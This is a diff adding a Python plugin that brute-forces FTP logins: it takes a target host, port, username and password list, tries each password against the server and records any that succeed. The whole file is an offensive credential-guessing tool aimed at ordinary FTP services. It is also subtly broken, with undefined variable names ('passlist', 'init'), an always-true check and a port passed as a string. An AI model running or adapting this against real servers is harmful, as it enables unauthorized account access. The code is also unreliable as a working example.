@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+Description = 'Bruteforce FTP Protocol.'
+
+from pluginsupport import *
+
+RHOST = ask('rhost')
+RPORT = ask('rport')
+USER = ask('userlist')
+PASSLIST = ask('passlist')
+
+from ftplib import FTP
+if RPORT == "":
+    print("Please Set An RPORT!")
+if RHOST == "":
+    print("Please Set An RHOST!")
+    exit()
+try:
+    users = USER
+    ftp = FTP()
+    ftp.connect(RHOST, RPORT)
+
+    with open(passlist,'r') as passwords:
+        for password in passwords:
+            password=password.replace("\n","")
+            try:
+                ftp.login(users,password)
+                if True:
+                    success("Successfully with ["+users+"]["+password+"]\n")
+                    Space()
+                    UTIL.sRegister(init,password)
+            except:
+                fail(" | Checking '"+password+"'")
+except KeyboardInterrupt:
+    exit()
+except TypeError:
+    print("Make Sure You Set an RHOST and RPORT. RHOST Must be an IP.")
